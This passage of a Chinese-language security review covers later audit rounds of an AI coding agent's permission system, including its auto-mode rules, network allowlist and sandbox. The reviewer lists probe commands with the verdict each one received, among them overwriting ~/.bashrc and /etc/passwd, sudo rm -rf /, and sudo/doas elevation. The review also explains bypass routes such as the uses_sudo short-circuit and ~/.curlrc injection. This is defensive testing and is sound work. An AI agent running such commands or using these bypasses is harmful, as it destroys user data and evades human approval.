| H2 | `crates/envoy-agent/tests/` 仍空 | 低 | 未动 |
| R3 | 选区快照按整屏分配 `String` | 低 | 一直未核对 |

### 15.7 结论

- 上轮点名的 5 项里 **3 项已修**（N-F/N-J/N-E 部分），2 项未修（N-G/N-H）。
- **N-F 是这批里最有价值的修复**：sink 清单从「按名字判定安全」收缩到纯 stdout 过滤器，
  直接堵掉了 `tar --use-compress-program` 这类能绕过整个白名单的写法。
  实测上轮五种绕过全部变为 `Ask`，且合法下载与管道没被误伤。
- 新增 N-K：上一轮 P2 的修复只补了 `needs_net` 这一维，
  漏了写路径这一维，导致 auto + 白名单网络下 `> ~/.bashrc` 被判 Allow。
  沙箱兜住了，所以是中危而非高危，但应当补齐。
- 门禁维持全绿（454 测试、clippy 0、fmt 0），软限超标从 45 涨到 47，
  与新增代码量相符。

**当前可以收工吗？** 安全面已从「高危」降到「中危 + 沙箱兜底」，
没有发现仍能让 agent 在无提示情况下外发数据或执行任意命令的路径。
剩下的 N-K/N-G/N-H 建议作为下一批修，不阻塞发布。

### 15.8 建议的下一步

1. N-K：3b 短路补 `&& !ctx.outside_workspace`（一行改动，消除策略与文档的矛盾）。
2. N-G：`-L` 配套 `--max-redirs 0` 或重定向后二次校验。
3. N-H：fetcher 强制 `-q`/`--no-config`。
4. N-E：解释器补进 `needs_net` 作为冗余防线。
5. H1/H2 作为独立机械重构。

---

## 16. 第九轮：七次修复复核

针对第 15 节的 N-K 及同源缺口再查。**结论：N-K 修得完整、有回归测试、文档同步；
同源缺口（`write`/`edit` 工具本身的越界）也已一并覆盖。仍剩 `uses_sudo` 一个守卫被绕过，
以及上轮未处理的 N-G/N-H。**

### 16.1 门禁：全绿

| 项 | 上轮 | 现在 |
| --- | --- | --- |
| `cargo test --workspace` | 454 通过 | **454 通过 0 失败** |
| `cargo clippy --workspace --all-targets` | 0 | 0 |
| `cargo fmt --all -- --check` | 0 | 0 |
| `scripts/check-file-sizes.py` | exit 0（47 软限） | exit 0 |

### 16.2 N-K 已修，且同源缺口一并覆盖

`rules.rs:305-313` 新增 `auto_outside_workspace`：

```rust
let auto_outside_workspace = mode == PermissionMode::Auto
    && ctx.outside_workspace
    && !ctx.is_temp_target
    && matches!(tool, "write" | "edit" | "exec");
```

注意它比我建议的只加 `&& !ctx.outside_workspace` 更精细：
**排除 `is_temp_target`**，所以写临时目录不会被误伤；**限定工具集**，
所以 `read`/`ls`/`glob`/`grep` 这类只读工具仍可读工作区外。

我认为这就是「同源缺口」：上一轮只堵了 shell 重定向这一条路径，
而 `write`/`edit` 工具本身走的是同一个 `outside_workspace` 维度，
如果不一起改，`write {"path": "~/.bashrc"}` 仍会绕过。

逐条实测确认（auto + 强制沙箱）：

```
N-K 回归（上轮 Allow，现 Ask）
curl -s https://github.com/x > ~/.bashrc            -> Ask  (outside=true)
curl -s https://github.com/x | grep ok > ~/.profile  -> Ask  (outside=true)
curl -s https://github.com/x > /etc/passwd           -> Ask  (outside=true)

同源缺口（write/edit 工具）
write {"path":"/etc/passwd"}     -> Ask "write outside workspace"
write {"path":"~/.bashrc"}       -> Ask
edit  {"path":"~/.profile"}      -> Ask
exec  {"command":"ls","cwd":"/etc"} -> Ask "shell command references path outside workspace"
exec  {"command":"ls","cwd":"~"}    -> Ask

未误伤（仍 Allow）
curl -s https://github.com/x > ./out.txt   -> Allow  (out=false)
curl -s https://github.com/x > /tmp/out.txt -> Allow (out=false, temp)
write {"path":"./in.txt"}                  -> Allow
read  {"path":"~/.bashrc"}                 -> Allow  (只读工具不受限)
```

回归测试也已补上：`tests_security.rs:22` 的
`auto_mode_asks_outside_workspace_and_never_auto_expands_extra_rw`
覆盖了 outside cwd、`write ~/.bashrc`、以及两条 curl 重定向用例，
并且特意用 `/var/envoy-p2-outside-dir`（不在 `/tmp` 下）来避开 `is_temp_path` 豁免。

`AGENTS.md:74-78` 也同步了措辞：
「mutating/`exec` targets stay inside the workspace or temp dir」。
文档、实现、测试三者这次是一致的。

### 16.3 本轮新发现：N-L `uses_sudo` 守卫仍被 3b 短路绕过（低）

3b 之后还有四个守卫（`rules.rs:325-351`）：受保护路径、`symlink_escape`、
`parse_failed`、`uses_sudo`。其中：

- 受保护路径 —— 3b 自身要求 `!ctx.protected_hit`，**未被绕过**；
- `parse_failed` —— `AGENTS.md:78` 明写「outside the relaxed-mode short-circuit」，
  属**已声明的有意行为**；
- `symlink_escape` —— 实际上被 `outside_workspace` 维度覆盖（符号链接指向区外时
  `outside_workspace` 必为 true），**等价被绕过但无实质影响**；
- **`uses_sudo` —— 没有任何维度覆盖它，实测确实被绕过。**

```
mode=default  sudo ls        -> Ask  "command elevates privileges via sudo/doas"
mode=auto     sudo ls        -> Allow "auto mode with an enforcing sandbox"
mode=auto     doas ls        -> Allow
mode=auto     sudo -E ls     -> Allow
mode=auto     sudo rm -rf /  -> Ask   (被 destructive 维度接住)
```

- 为什么危害是「低」：这条命令仍然被 bwrap 包着，`/` 是只读绑定，
  sudo 在命名空间内提权拿不到宿主 root，`WorkspaceWrite` 之外仍写不进去。
  真正能被 sudo/doas 利用的场景（改宿主系统、安装 setuid）都被沙箱挡住。
- 但它确实是一条**代码里存在、却永远不生效**的守卫，与
  `AGENTS.md`「do not add implicit behavior」的精神不符，
  也让读代码的人误以为 auto 下 sudo 会被拦。
- 建议（一行）：`relaxed` 条件补 `&& !ctx.uses_sudo`。
  若要保守，把 `parse_failed` 也一起补上——虽然文档说它可绕过，
  但「解析失败就放行」始终是弱假设。

### 16.4 仍未处理（2 项，与上轮相同）

| 编号 | 问题 | 严重度 | 现状 |
| --- | --- | --- | --- |
| N-G | `-L` 在允许表（`net_allowlist.rs:197`），`max_redirs` 出现 0 次，无重定向限制 | 中 | 未修 |
| N-H | `-q` 已允许（`net_allowlist.rs:188`）但无任何代码强制要求 | 中低 | 未修 |

`-L` 的现实风险取决于白名单域是否存在开放重定向；项目把
`release-assets.githubusercontent.com` 列入白名单，说明重定向是预期用法，
所以不能简单禁掉，建议配 `--max-redirs 0` 或重定向后二次校验。

`-q` 的问题需要能写家目录才可利用（`~/.curlrc` 注入 `url =`），属二阶。

其余遗留不变：24 处 `too_many_arguments`、47 个软限超标文件、
`crates/envoy-agent/tests/` 仍空、R3 选区快照未核对。

### 16.5 结论

- **N-K 修得比我的建议更好**：不只加了 `outside_workspace` 维度，
  还精确排除了 `is_temp_target`、限定了 `write|edit|exec` 工具集，
  既有回归测试，又同步了 `AGENTS.md`。同源缺口（write/edit 工具越界）一并关闭。
- 实测 8 条越界用例全部 `Ask`、4 条正常用例全部 `Allow`，无误伤。
- 唯一新发现是 N-L（`uses_sudo` 绕过，低危，被沙箱兜住），一行可修。
- 安全面现在没有已知的「无提示外发数据」或「无提示执行任意命令」路径；
  剩下的 N-G/N-H 都是「需要额外前提（开放重定向 / 可写家目录）」的二阶问题。

**可以收工。** 建议把 N-L 那一行和 N-G/N-H 一起作为收尾批次，
不必再开新的复核轮次；H1/H2 作为独立的机械重构 PR 处理。

### 16.6 建议的收尾批次

1. N-L：`relaxed` 补 `&& !ctx.uses_sudo`（一行）。
2. N-G：`-L` 配 `--max-redirs 0`，或重定向后对最终 URL 二次校验。
3. N-H：fetcher 段强制 `-q`/`--no-config`。
4. H1/H2 独立 PR；R3 顺手核对。

---

## 17. 第十轮：收尾批次复核

针对第 16 节的 N-L/N-G/N-H 再查。**结论：N-L 已修并有回归测试；
N-G 部分修（上限生效但可省略）；N-H 未改，且测试显示这是有意行为。**

### 17.1 门禁：全绿

| 项 | 上轮 | 现在 |
| --- | --- | --- |
| `cargo test --workspace` | 454 通过 | **454 通过 0 失败** |
| `cargo clippy --workspace --all-targets` | 0 | 0 |
| `cargo fmt --all -- --check` | 0 | 0 |
| `scripts/check-file-sizes.py` | exit 0 | exit 0 |

无孤儿 `.rs` 文件；我的临时探针已清理。

### 17.2 N-L `uses_sudo` 绕过——已修，且有回归测试

`rules.rs:312-314` 给 `auto` 分支补了 `&& !ctx.uses_sudo`：

```rust
let relaxed = mode == PermissionMode::Turbo
    || (mode == PermissionMode::Auto
        && opts.sandbox_enforces_workspace
        && !auto_unallowlisted_net
        && !auto_outside_workspace
        && !ctx.uses_sudo);
```

实测（auto + 强制沙箱）：

```
sudo ls          -> Ask   (上轮 Allow)
doas ls          -> Ask   (上轮 Allow)
sudo -E ls       -> Ask   (上轮 Allow)
sudo rm -rf /    -> Ask
```

回归测试也已到位：`crates/envoy-agent/src/permissions/tests_security.rs:568-569` 把 `sudo ls`、`doas ls`
放进「auto 模式必须 Ask」的循环里。

**一处文档小缺口**：`AGENTS.md:74-78` 描述 relaxed 条件时列了
「工作区边界 / 目标在区内或临时目录 / 无非白名单网络」三条，
**没有提 `uses_sudo`**。代码比文档更保守（这是安全的方向），
但契约文件应与之对齐，否则读文档的人会以为 auto 下 sudo 会放行。
建议在那一句里补「且不提权（`sudo`/`doas`）」。

另外确认 `turbo` 下 `sudo rm -rf /` 仍 Allow —— 这是**设计如此**
（`AGENTS.md` 写「turbo always」，ADR 005 也说明 turbo 是无条件放宽），
不属于缺陷。

### 17.3 N-G 重定向——部分修，上限可省略

新增了 `--max-redirs` 的上限校验（`net_allowlist.rs:282-298`），
两种写法都覆盖，且边界正确：

```
curl -L --max-redirs 0 -fLO https://github.com/x   -> Allow
curl -L --max-redirs 5 -fLO https://github.com/x   -> Allow
curl -L --max-redirs 6 -fLO https://github.com/x   -> Ask   (超限)
curl -L --max-redirs=5 -fLO https://github.com/x   -> Allow
curl -L --max-redirs -1 ...                        -> Ask   (非数字)
```

同上文件的 `:566-567` 也覆盖了 `-1` 与 `50` 两种越界。

**但上限是可选而非强制**：完全省略 `--max-redirs` 时仍放行，
此时 curl 用默认值（50 跳）：

```
curl -L -fLO https://github.com/x                  -> Allow
curl -fsSL https://raw.githubusercontent.com/... | head -n 20  -> Allow
```

而且 `net_allowlist.rs:509` 的测试**显式断言**了后者应被放行，
说明「允许 `-L` 但不强制配上限」是这轮的有意选择，不是遗漏。

- 残余风险：白名单域只要存在开放重定向，就能把请求带到白名单外，
  最多 50 跳。前提是那个域被攻破或存在开放重定向，属二阶。
- 若想彻底关闭：`-L` 出现时要求必须同时有 `--max-redirs 0`（或 ≤5），
  否则 fail-closed。代价是 `curl -fsSL ... | head` 这类常见用法
  要么加参数、要么变成 Ask。**这是一个取舍，不是必须修的 bug。**

### 17.4 N-H `-q`/`--no-config`——未改，属有意行为

`-q`/`--disable`（curl）与 `--no-config`（wget）在允许标志表里，
但没有任何代码要求它们必须存在：

```
curl -fLO https://github.com/x           -> Allow
wget https://static.crates.io/x          -> Allow
```

而 `net_allowlist.rs:499-512` 的测试同时断言了「带 `-q`」与「不带 `-q`」
两种情况都应放行，所以这同样是**已知的设计选择**：
白名单校验的是 argv，不限制 curl/wget 读取家目录配置文件。

- 残余风险：`~/.curlrc` 里的 `url =` / `proxy =` 能改变实际目标。
  前提是攻击者能写家目录（同用户或已越过工作区边界），属二阶。
- 若要收紧：fetcher 段强制 `-q`/`--no-config`，或执行时把
  `HOME`/`CURL_HOME`/`WGETRC` 指向空临时目录（后者不影响命令写法，更友好）。

### 17.5 遗留清单（与上轮一致）

| 编号 | 问题 | 严重度 | 状态 |
| --- | --- | --- | --- |
| N-G | `-L` 可省略 `--max-redirs` | 中低 | 部分修，残余为有意取舍 |
| N-H | fetcher 未强制 `-q`/`--no-config` | 低 | 未改，有意 |
| N-M | `AGENTS.md` 未提 `uses_sudo` 守卫 | 低（文档） | 本轮新发现 |
| H1 | 24 处 `too_many_arguments`、47 个软限超标 | 中 | 未动 |
| H2 | `crates/envoy-agent/tests/` 仍空 | 低 | 未动 |
| R3 | 选区快照按整屏分配 `String` | 低 | 一直未核对 |

### 17.6 结论

- **N-L 修得完整**：代码 + 回归测试都在，实测三条 sudo/doas 用例全部 Ask。
  顺带确认 turbo 下仍放行是设计意图，不是漏改。
- N-G 与 N-H 都是**部分修 / 有意未修**：上限和允许标志加了，
  但没有强制。我在第 16 节把它们列为「未修」，这一轮看测试后修正判断——
  它们是有意取舍，不是遗漏，残余风险都在「需要额外前提」的二阶范畴。
- 全部门禁绿，无孤儿文件，无新增缺陷（唯一新发现是 N-M 文档缺口）。
- 安全面维持第 16 节的判断：没有「无提示外发数据」或「无提示执行任意命令」的路径。

**收工判定：可以。** 剩下三项（N-G 取舍、N-H 取舍、N-M 一行文档）
都不阻塞发布；H1/H2 照旧走独立重构 PR。

### 17.7 若要继续收尾

1. N-M：`AGENTS.md` 那段补「且不提权（`sudo`/`doas`）」——一行，纯文档。
2. N-H（可选）：执行 fetcher 时把 `HOME`/`CURL_HOME`/`WGETRC` 指向空临时目录，
   比强制 `-q` 更不打扰用户。
3. N-G（可选）：若团队认为开放重定向风险不可接受，`-L` 强制配 `--max-redirs 0`。

---

## 附：本文的边界

- 第一轮五路 subagent 的完整报告未逐字保留，本文只保留经复核后成立、推翻或需要标注的部分。
- **未核对**、因此未作结论的范围：`envoy-service` 的
  `remote.rs`/`client.rs`/`conduit/*`，`runtime/{control,side,side_watch,monitors,hooks}.rs`，
  `envoy-core/src/{fs,log,config,audit,sandbox/bwrap,seatbelt}.rs`，
  `envoy-cli/src/headless/`、`tui/mouse.rs`、`tui/state/edit.rs`、`tui/decrypt.rs`，
  以及锁序（只看到 `sessions -> Live` 单向，未审计全部调用点）。
- 本轮未做 PTY 真机手测，交互类结论全部来自 `TestBackend` 渲染测试。
